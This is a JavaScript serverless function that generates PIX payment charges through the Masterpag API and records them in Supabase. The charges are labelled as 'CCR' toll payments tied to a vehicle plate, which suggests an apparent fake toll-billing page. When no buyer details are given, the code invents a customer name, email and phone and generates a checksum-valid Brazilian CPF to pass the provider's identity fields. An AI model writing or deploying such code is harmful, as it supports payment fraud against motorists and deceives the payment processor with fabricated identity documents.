import { createClient } from '@supabase/supabase-js';

// Inicialização do Supabase fora do handler para reutilizar conexões
const SUPABASE_URL = 'https://tpawkcmecwwopkobkwzu.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_K0WYBftMh9R8B6kPD92yTQ_VDEyoFct';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

export async function onRequestOptions() {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}

export async function onRequestPost(context) {
  const { request, env } = context;
  
  try {
    const publicKey = env.MASTERPAG_PUBLIC_KEY;
    const secretKey = env.MASTERPAG_SECRET_KEY;
    const baseUrl = 'https://api.masterpag.com/functions/v1';
    
    if (!publicKey || !secretKey) {
      return new Response(JSON.stringify({
        success: false,
        error: 'Configuração de API incompleta.'
      }), {
        status: 500,
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
      });
    }
    
    const body = await request.json();
    
    // Gerador de CPF válido (Algoritmo corrigido)
    function gerarCPFValido() {
      const randomDigit = () => Math.floor(Math.random() * 9);
      const n = Array.from({ length: 9 }, randomDigit);
      
      let d1 = n.reduce((acc, curr, idx) => acc + curr * (10 - idx), 0);
      d1 = 11 - (d1 % 11);
      if (d1 >= 10) d1 = 0;
      
      let d2 = n.reduce((acc, curr, idx) => acc + curr * (11 - idx), 0) + d1 * 2;
      d2 = 11 - (d2 % 11);
      if (d2 >= 10) d2 = 0;
      
      return n.join('') + d1 + d2;
    }

    const timestamp = Date.now();
    const payload = {
      amount: body.amount || 38.90,
      paymentMethod: 'pix',
      customer: {
        name: body.customer?.name || `Cliente ${timestamp}`,
        email: body.customer?.email || `user${timestamp}@gmail.com`,
        phone: body.customer?.phone || `119${Math.floor(10000000 + Math.random() * 90000000)}`,
        document: {
          number: body.customer?.document || gerarCPFValido(),
          type: 'cpf'
        }
      },
      items: [{
        title: `Pagamento CCR - Placa ${body.plate || 'N/A'}`,
        unitPrice: body.amount || 38.90,
        quantity: 1,
        tangible: true
      }],
      pix: {
        expirationDate: new Date(Date.now() + 15 * 60 * 1000).toISOString()
      }
    };
    
    // Chamada para a Masterpag
    const response = await fetch(`${baseUrl}/pix-receive`, {
      method: 'POST',
      headers: {
        'x-public-key': publicKey,
        'x-secret-key': secretKey,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json();
    
    if (response.ok && data.pix && data.pix.qrCode) {
      const txId = data.id || data.shortId || data.pix.qrCode.split('/').pop();
      
      // Executa o insert no Supabase em background
      context.waitUntil(
        supabase
          .from('payments')
          .insert([{
            transaction_id: txId,
            pix_code: data.pix.qrCode,
            status: 'pending',
            amount: body.amount || 38.90,
            plate: body.plate
          }])
          .then(({ error }) => {
            if (error) console.error('Supabase insert error:', error);
          })
      );
      
      return new Response(JSON.stringify({
        success: true,
        transactionId: txId,
        pixCode: data.pix.qrCode,
        qrImage: data.pix.qrCodeUrl || null,
        amount: body.amount || 38.90,
        plate: body.plate,
        expiresAt: data.pix.expirationDate,
        status: data.status
      }), {
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    } else {
      return new Response(JSON.stringify({
        success: false,
        error: data.error?.message || 'Erro ao gerar PIX',
        details: data
      }), {
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    }
  } catch (error) {
    return new Response(JSON.stringify({ 
      success: false, 
      error: error.message 
    }), {
      status: 500,
      headers: { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
}
